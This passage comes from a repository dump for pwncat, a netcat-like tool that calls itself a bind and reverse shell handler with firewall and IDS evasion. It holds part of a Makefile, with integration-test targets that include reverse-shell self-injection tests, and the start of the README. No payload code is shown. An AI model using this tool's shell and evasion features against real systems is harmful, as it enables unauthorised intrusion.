\"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--client-103:\n\t$(INTPATH)01-behaviour-quit--client/103---udp---client_stays---when_server_is_killed---client_command---before_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--client-200:\n\t$(INTPATH)01-behaviour-quit--client/200---tcp---client_stays---when_valid_http_request.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--client-201:\n\t$(INTPATH)01-behaviour-quit--client/201---tcp---client_quites---when_invalid_http_request.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n\n.PHONY: _test-behaviour-quit--server\n_test-behaviour-quit--server: __test-behaviour-quit--server-000\n_test-behaviour-quit--server: __test-behaviour-quit--server-001\n_test-behaviour-quit--server: __test-behaviour-quit--server-002\n_test-behaviour-quit--server: __test-behaviour-quit--server-003\n_test-behaviour-quit--server: __test-behaviour-quit--server-004\n_test-behaviour-quit--server: __test-behaviour-quit--server-100\n_test-behaviour-quit--server: __test-behaviour-quit--server-101\n_test-behaviour-quit--server: __test-behaviour-quit--server-103\n_test-behaviour-quit--server: __test-behaviour-quit--server-104\n_test-behaviour-quit--server: __test-behaviour-quit--server-200\n_test-behaviour-quit--server: __test-behaviour-quit--server-201\n__test-behaviour-quit--server-000:\n\t$(INTPATH)02-behaviour-quit--server/000---tcp---server_quits---when_client_is_killed---server_default---before_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--server-001:\n\t$(INTPATH)02-behaviour-quit--server/001---tcp---server_quits---when_client_is_killed---server_default---after_client_sent_data.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--server-002:\n\t$(INTPATH)02-behaviour-quit--server/002---tcp---server_quits---when_client_is_killed---server_default---after_server_sent_data.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--server-003:\n\t$(INTPATH)02-behaviour-quit--server/003---tcp---server_quits---when_client_is_killed---server_command---before_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--server-004:\n\t$(INTPATH)02-behaviour-quit--server/004---tcp---server_quits---when_client_is_killed---server_command---after_client_sent_command.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--server-100:\n\t$(INTPATH)02-behaviour-quit--server/100---udp---server_stays---when_client_is_killed---server_default---before_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--server-101:\n\t$(INTPATH)02-behaviour-quit--server/101---udp---server_stays---when_client_is_killed---server_default---after_client_sent_data.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--server-103:\n\t$(INTPATH)02-behaviour-quit--server/103---udp---server_stays---when_client_is_killed---server_command---before_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--server-104:\n\t$(INTPATH)02-behaviour-quit--server/104---udp---server_stays---when_client_is_killed---server_command---after_client_sends_command.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--server-200:\n\t$(INTPATH)02-behaviour-quit--server/200---udp---server_reacc---when_client_is_killed---server_default---after_client_sent_data.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--server-201:\n\t$(INTPATH)02-behaviour-quit--server/201---udp---server_reacc---when_client_is_killed---server_command---after_client_sent_command.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n\n.PHONY: _test-behaviour-base--file_transfer\n_test-behaviour-base--file_transfer: __test-behaviour-base--file_transfer-send_normal\n_test-behaviour-base--file_transfer: __test-behaviour-base--file_transfer-send_on_eof\n__test-behaviour-base--file_transfer-send_normal:\n\t$(INTPATH)03-behaviour-base--file_transfer/000---tcp---client_sends-normal.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-base--file_transfer-send_on_eof:\n\t$(INTPATH)03-behaviour-base--file_transfer/001---tcp---client_sends-on_eof.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n\n.PHONY: _test-mode--local_forward\n_test-mode--local_forward:\n\ttests/integration/run.sh \"10-mode---local_forward\" \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n\n.PHONY: _test-mode--remote_forward\n_test-mode--remote_forward:\n\ttests/integration/run.sh \"11-mode---remote_forward\" \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n\n.PHONY: _test-options--nodns\n_test-options--nodns:\n\ttests/integration/run.sh \"20-options---nodns\" \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n\n.PHONY: _test-options--crlf\n_test-options--crlf:\n\ttests/integration/run.sh \"21-options---crlf\" \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n\n.PHONY: _test-options--keep_open\n_test-options--keep_open: __test-options--keep_open-000\n_test-options--keep_open: __test-options--keep_open-001\n_test-options--keep_open: __test-options--keep_open-002\n_test-options--keep_open: __test-options--keep_open-100\n_test-options--keep_open: __test-options--keep_open-101\n_test-options--keep_open: __test-options--keep_open-200\n_test-options--keep_open: __test-options--keep_open-201\n_test-options--keep_open: __test-options--keep_open-202\n__test-options--keep_open-000:\n\t$(INTPATH)22-options---keep_open/000---tcp---server_reacc---three_clients---server_default---cli_nosend-cli_nosend-cli_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-options--keep_open-001:\n\t$(INTPATH)22-options---keep_open/001---tcp---server_reacc---three_clients---server_default---cli_nosend-cli_send-cli_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-options--keep_open-002:\n\t$(INTPATH)22-options---keep_open/002---tcp---server_reacc---three_clients---server_default---cli_send-cli_send-cli_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-options--keep_open-100:\n\t$(INTPATH)22-options---keep_open/100---tcp---server_reacc---three_clients---server_default---srv_send-cli_nosend-cli_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-options--keep_open-101:\n\t$(INTPATH)22-options---keep_open/101---tcp---server_reacc---three_clients---server_default---srv_send-cli_send-cli_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-options--keep_open-200:\n\t$(INTPATH)22-options---keep_open/200---tcp---server_reacc---three_clients---server_command---cli_nosend-cli_nosend-cli_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-options--keep_open-201:\n\t$(INTPATH)22-options---keep_open/201---tcp---server_reacc---three_clients---server_command---cli_nosend-cli_send-cli_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-options--keep_open-202:\n\t$(INTPATH)22-options---keep_open/202---tcp---server_reacc---three_clients---server_command---cli_send-cli_send-cli_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n\n.PHONY: _test-options--reconn\n_test-options--reconn: __test-options--reconn-000\n_test-options--reconn: __test-options--reconn-001\n_test-options--reconn: __test-options--reconn-002\n__test-options--reconn-000:\n\t$(INTPATH)23-options---reconn/000---tcp---client_reconn---three_servers---server_default---srv_down_cli_send-srv_nosend-srv_nosend-srv_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-options--reconn-001:\n\t$(INTPATH)23-options---reconn/001---tcp---client_reconn---three_servers---server_default---srv_down_cli_send-srv_nosend-srv_send-srv_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-options--reconn-002:\n\t$(INTPATH)23-options---reconn/002---tcp---client_reconn---three_servers---server_default---srv_down_cli_send-srv_send-srv_send-srv_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n\n.PHONY: _test-options--ping_init\n_test-options--ping_intvl:\n\ttests/integration/run.sh \"25-options---ping_intvl\" \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n\n.PHONY: _test-options--ping_word\n_test-options--ping_word:\n\ttests/integration/run.sh \"26-options---ping_word\" \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n\n.PHONY: _test-cnc--inject_shell\n_test-cnc--inject_shell: __test-cnc--inject_shell-pwncat\n_test-cnc--inject_shell: __test-cnc--inject_shell-revshelll-multi_byte-banner-suffix\n_test-cnc--inject_shell: __test-cnc--inject_shell-revshelll-single_byte-banner-suffix\n_test-cnc--inject_shell: __test-cnc--inject_shell-revshelll-multi_byte-banner-suffix-delayed\n_test-cnc--inject_shell: __test-cnc--inject_shell-revshelll-single_byte-banner-suffix-delayed\n__test-cnc--inject_shell-pwncat:\n\t$(INTPATH)30-cnc---self_inject/000---tcp---pwncat_as_rev_shell.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-cnc--inject_shell-revshelll-multi_byte-banner-suffix:\n\t$(INTPATH)30-cnc---self_inject/001---tcp---revshell-multi_byte-banner-suffix.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-cnc--inject_shell-revshelll-single_byte-banner-suffix:\n\t$(INTPATH)30-cnc---self_inject/002---tcp---revshell-single_byte-banner-suffix.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-cnc--inject_shell-revshelll-multi_byte-banner-suffix-delayed:\n\t$(INTPATH)30-cnc---self_inject/003---tcp---revshell-multi_byte-banner-suffix-delayed.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-cnc--inject_shell-revshelll-single_byte-banner-suffix-delayed:\n\t$(INTPATH)30-cnc---self_inject/004---tcp---revshell-single_byte-banner-suffix-delayed.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n\n\n\n# -------------------------------------------------------------------------------------------------\n# Documentation\n# -------------------------------------------------------------------------------------------------\ndocs: _docs-man\ndocs: _docs-api\ndocs: _docs-mypy_type_coverage\ndocs: _docs-version_readme\n\n.PHONY: _docs-man\n_docs-man: $(BINPATH)$(BINNAME)\n\tdocker pull python:3-alpine\n\tdocker run --rm $$(tty -s && echo \"-it\" || echo) -v $(PWD):/data -w /data -e UID=$(UID) -e GID=${GID} python:3-alpine sh -c ' \\\n\t\tapk add help2man \\\n\t\t&& help2man -n $(BINNAME) --no-info --source=https://github.com/cytopia/pwncat -s 1 -o $(MANPATH)$(BINNAME).1 $(BINPATH)$(BINNAME) \\\n\t\t&& chown $${UID}:$${GID} $(MANPATH)$(BINNAME).1'\n\tdocker run --rm $$(tty -s && echo \"-it\" || echo) -v $(PWD):/data -w /data -e UID=$(UID) -e GID=${GID} python:3-alpine sh -c ' \\\n\t\tapk add groff \\\n\t\t&& cat $(MANPATH)$(BINNAME).1 \\\n\t\t\t| groff -mandoc -Thtml \\\n\t\t\t| sed \"s/.*CreationDate:.*//g\" \\\n\t\t\t| sed \"s|<title>.*|<title>pwncat(1) - man page</title>|g\" \\\n\t\t\t| sed \"s|<head>|<head>\\n<meta name=\\\"author\\\" content=\\\"cytopia\\\">|g\" \\\n\t\t\t| sed \"s|<head>|<head>\\n<meta name=\\\"description\\\" content=\\\"pwncat - netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python (PSE)\\\">|g\" \\\n\t\t\t| sed \"s|<head>|<head>\\n<meta name=\\\"keywords\\\" content=\\\"pwncat, reverse shell, bind shell, exploit, exploitation, proxy, port forwarding, self-inject\\\">|g\" \\\n\t\t\t| sed \"s|<h1.*|<h1 align=\\\"center\\\">PWNCAT: man page</h1>|g\" \\\n\t\t\t| sed \"s|pwncat</p>|a sophisticated bind and reverse shell handler with many features as well as a drop-in replacement or compatible complement to netcat, ncat or socat.</p>|g\" \\\n\t\t\t> $(DOCPATH)$(BINNAME).man.html \\\n\t\t&& chown $${UID}:$${GID} $(DOCPATH)$(BINNAME).man.html'\n\n.PHONY: _docs-api\n_docs-api:\n\t@# Generate pdoc API page\n\tdocker pull python:3-alpine\n\tdocker run --rm $$(tty -s && echo \"-it\" || echo) -v $(PWD):/data -w /data -e UID=$(UID) -e GID=${GID} python:3-alpine sh -c ' \\\n\t\tpip install pdoc3 \\\n\t\t&& mkdir -p /tmp \\\n\t\t&& cp $(BINPATH)$(BINNAME) /tmp/$(BINNAME).py \\\n\t\t&& pdoc3 -f -o $(DOCPATH) --html --config show_inherited_members=False /tmp/$(BINNAME).py \\\n\t\t&& mv $(DOCPATH)$(BINNAME).html $(DOCPATH)$(BINNAME).api.html \\\n\t\t&& chown $${UID}:$${GID} $(DOCPATH)$(BINNAME).api.html'\n\n.PHONY: _docs-mypy_type_coverage\n_docs-mypy_type_coverage:\n\t@# Generate mypy code coverage page\n\tdocker pull cytopia/mypy\n\tdocker pull python:3-alpine\n\tdocker run --rm $$(tty -s && echo \"-it\" || echo) -v ${PWD}:/data -w /data -e UID=$(UID) -e GID=${GID} --entrypoint= cytopia/mypy sh -c ' \\\n\t\tmypy --config-file setup.cfg --html-report tmp $(BINPATH)$(BINNAME) \\\n\t\t&& cp -f tmp/mypy-html.css docs/css/mypy.css \\\n\t\t\\\n\t\t&& cat tmp/html/bin/pwncat.html \\\n\t\t\t| grep -B 100000 \"<body>\" \\\n\t\t\t> tmp/part.html-head \\\n\t\t&& cat tmp/index.html \\\n\t\t\t| grep -A 100000 \"<h1>\" \\\n\t\t\t| grep -B 100000 \"</table>\" \\\n\t\t\t> tmp/part.html-coverage-table.html \\\n\t\t&& cat tmp/html/bin/pwncat.html \\\n\t\t\t| grep -A 100000 \"<body>\" \\\n\t\t\t| sed \"s|<body>||g\" \\\n\t\t\t| sed \"s|__main__|pwncat|g\" \\\n\t\t\t> tmp/part.html-content \\\n\t\t\\\n\t\t&& echo \"<!DOCTYPE html>\" \\\n\t\t\t> docs/pwncat.type.html \\\n\t\t&& cat tmp/part.html-head \\\n\t\t\t| sed \"s|<html>|<html lang=\\\"en\\\">|g\" \\\n\t\t\t| sed \"s|../../mypy-html.css|css/mypy.css|g\" \\\n\t\t\t| sed \"s|<head>|<head>\\n<title>pwncat - Type Coverage</title>|g\" \\\n\t\t\t>> docs/pwncat.type.html \\\n\t\t&& cat tmp/part.html-coverage-table.html \\\n\t\t\t| sed \"s|<a.*</a>|bin/pwncat|g\" \\\n\t\t\t| sed \"s|<h1>.*|<h1>pwncat - Type Coverage</h1>|g\" \\\n\t\t\t>> docs/pwncat.type.html \\\n\t\t&& cat tmp/part.html-content \\\n\t\t\t>> docs/pwncat.type.html \\\n\t\t\\\n\t\t&& chown $${UID}:$${GID} docs/pwncat.type.html \\\n\t\t&& chown $${UID}:$${GID} docs/css/mypy.css \\\n\t\t&& rm -r tmp/'\n\t@# Update code coverage in README.md\n\tdocker run --rm $$(tty -s && echo \"-it\" || echo) -v ${PWD}:/data -w /data python:3-alpine sh -c ' \\\n\t\tapk add bc \\\n\t\t&& percent=$$(grep \"% imprecise\" docs/pwncat.type.html | grep \"th\" | grep -Eo \"[.0-9]+\") \\\n\t\t&& coverage=$$(echo \"100 - $${percent}\" | bc) \\\n\t\t&& sed -i \"s/fully typed: \\([.0-9]*\\)/fully typed: $${coverage}/g\" README.md'\n\n_docs-version_readme:\n\tVERSION=\"$$( grep -E '^VERSION = ' bin/pwncat | awk -F'\"' '{print $$2}' )\" \\\n\t\t&& echo \"$${VERSION}\" \\\n\t\t&& sed -i'' \"s/^Current version is.*/Current version is: **$${VERSION}**/g\" ${PWD}/README.md\n\n\n# -------------------------------------------------------------------------------------------------\n# Generate GitHub Action workflow pipelines\n# -------------------------------------------------------------------------------------------------\npipeline:\n\t$(PWD)/tests/pipelines/run.sh\n\n\n# -------------------------------------------------------------------------------------------------\n# Build Targets\n# -------------------------------------------------------------------------------------------------\nbuild: clean\nbuild: _lint-version\nbuild: _build-source_dist\nbuild: _build-binary_dist\nbuild: _build-python_package\nbuild: _build-check_python_package\n\n.PHONY: _build_source_dist\n_build-source_dist:\n\t@echo \"Create source distribution\"\n\tdocker run \\\n\t\t--rm \\\n\t\t$$(tty -s && echo \"-it\" || echo) \\\n\t\t-v $(PWD):/data \\\n\t\t-w /data \\\n\t\t-u $$(id -u):$$(id -g) \\\n\t\tpython:$(PYTHON_VERSION)-alpine \\\n\t\tpython setup.py sdist\n\n.PHONY: _build_binary_dist\n_build-binary_dist:\n\t@echo \"Create binary distribution\"\n\tdocker run \\\n\t\t--rm \\\n\t\t$$(tty -s && echo \"-it\" || echo) \\\n\t\t-v $(PWD):/data \\\n\t\t-w /data \\\n\t\t-u $$(id -u):$$(id -g) \\\n\t\tpython:$(PYTHON_VERSION)-alpine \\\n\t\tpython setup.py bdist_wheel --universal\n\n.PHONY: _build_python_package\n_build-python_package:\n\t@echo \"Build Python package\"\n\tdocker run \\\n\t\t--rm \\\n\t\t$$(tty -s && echo \"-it\" || echo) \\\n\t\t-v $(PWD):/data \\\n\t\t-w /data \\\n\t\t-u $$(id -u):$$(id -g) \\\n\t\tpython:$(PYTHON_VERSION)-alpine \\\n\t\tpython setup.py build\n\n.PHONY: _build_check_python_package\n_build-check_python_package:\n\t@echo \"Check Python package\"\n\tdocker run \\\n\t\t--rm \\\n\t\t$$(tty -s && echo \"-it\" || echo) \\\n\t\t-v $(PWD):/data \\\n\t\t-w /data \\\n\t\tpython:$(PYTHON_VERSION)-alpine \\\n\t\tsh -c \"pip install twine \\\n\t\t&& twine check dist/*\"\n\n\n# -------------------------------------------------------------------------------------------------\n# Publish Targets\n# -------------------------------------------------------------------------------------------------\ndeploy:\n\tdocker run \\\n\t\t--rm \\\n\t\t$$(tty -s && echo \"-it\" || echo) \\\n\t\t-v $(PWD):/data \\\n\t\t-w /data \\\n\t\tpython:$(PYTHON_VERSION)-alpine \\\n\t\tsh -c \"pip install twine \\\n\t\t&& twine upload dist/*\"\n\n\n# -------------------------------------------------------------------------------------------------\n# Misc Targets\n# -------------------------------------------------------------------------------------------------\nautoformat:\n\tdocker run \\\n\t\t--rm \\\n\t\t$$(tty -s && echo \"-it\" || echo) \\\n\t\t-v $(PWD):/data \\\n\t\t-w /data \\\n\t\tcytopia/black -l 100 $(BINPATH)$(BINNAME)\n\nclean:\n\t-rm -rf $(BINNAME).egg-info/\n\t-rm -rf dist/\n\t-rm -rf build/\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 69.138671875,
          "content": "**[Docs](#closed_book-documentation)** |\n**[Install](#tada-install)** |\n**[TL;DR](#coffee-tldr)** |\n**[Features](#star-features)** |\n**[Behaviour](#cop-behaviour)** |\n**[Usage](#computer-usage)** |\n**[Examples](#bulb-examples)** |\n**[FAQ](#information_source-faq)** |\n**[Contributing](#octocat-contributing)** |\n**[Disclaimer](#exclamation-disclaimer)** |\n**[License](#page_facing_up-license)**\n\n---\n\n<center><img alt=\"pwncat banner\" title=\"pwncat\" src=\"art/banner-1.png\" style=\"\"/></center>\n\n# pwncat\n\n[![](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)\n[![Documentation Status](https://readthedocs.org/projects/pwn-cat/badge/?version=latest)](https://docs.pwncat.org/en/latest/?badge=latest)\n[![PyPI](https://img.shields.io/pypi/v/pwncat)](https://pypi.org/project/pwncat/)\n[![PyPI - Status](https://img.shields.io/pypi/status/pwncat)](https://pypi.org/project/pwncat/)\n[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwncat)](https://pypi.org/project/pwncat/)\n[![PyPI - Format](https://img.shields.io/pypi/format/pwncat)](https://pypi.org/project/pwncat/)\n[![PyPI - Implementation](https://img.shields.io/pypi/implementation/pwncat)](https://pypi.org/project/pwncat/)\n[![PyPI - License](https://img.shields.io/pypi/l/pwncat)](https://pypi.org/project/pwncat/)\n\n[![Build Status](https://github.com/cytopia/pwncat/workflows/linting/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=linting)\n[![Build Status](https://github.com/cytopia/pwncat/workflows/building/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=building)\n\n\n> &nbsp;\n> #### Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python ([PSE](pse/)). - [docs.pwncat.org](https://docs.pwncat.org)\n> &nbsp;\n\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; border:none;\">\n <thead>\n  <tr valign=\"top\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\">\n   <th border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\">Code Style</td>\n   <th border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\"></td>\n   <th border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\">Integration Tests <sup><small>[2]</small></sup></td>\n  </tr>\n </thead>\n <tbody>\n  <tr valign=\"top\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\">\n   <td border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\">\n    <table>\n     <thead>\n      <tr>\n       <th>Styler</th>\n       <th>Status</th>\n      </tr>\n     </thead>\n     <tbody>\n      <tr>\n       <td><a href=\"https://github.com/psf/black\">Black</a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=black\"><img src=\"https://github.com/cytopia/pwncat/workflows/black/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <td><a href=\"https://github.com/python/mypy\">mypy</a> <sup><small>[1]</small></sup></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mypy\"><img src=\"https://github.com/cytopia/pwncat/workflows/mypy/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <td><a href=\"https://github.com/PyCQA/pycodestyle\">pycodestyle</a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=pycode\"><img src=\"https://github.com/cytopia/pwncat/workflows/pycode/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <td><a href=\"https://github.com/PyCQA/pydocstyle\">pydocstyle</a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=pydoc\"><img src=\"https://github.com/cytopia/pwncat/workflows/pydoc/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <td><a href=\"https://github.com/PyCQA/pylint\">pylint</a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=pylint\"><img src=\"https://github.com/cytopia/pwncat/workflows/pylint/badge.svg\" /></a></td>\n      </tr>\n     </tbody>\n    </table>\n   </td>\n   <td border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\"></td>\n   <td border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border:none;\">\n    <table>\n     <thead>\n      <tr>\n       <th><sub>Python</sub><sup>OS</sup></th>\n       <th>Linux</th>\n       <th>MacOS</th>\n       <th>Windows</th>\n      </tr>\n     </thead>\n     <tbody>\n      <tr>\n       <th>2.7</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-2.7\"><img src=\"https://github.com/cytopia/pwncat/workflows/ubu-2.7/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-2.7\"><img src=\"https://github.com/cytopia/pwncat/workflows/mac-2.7/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-2.7\"><img 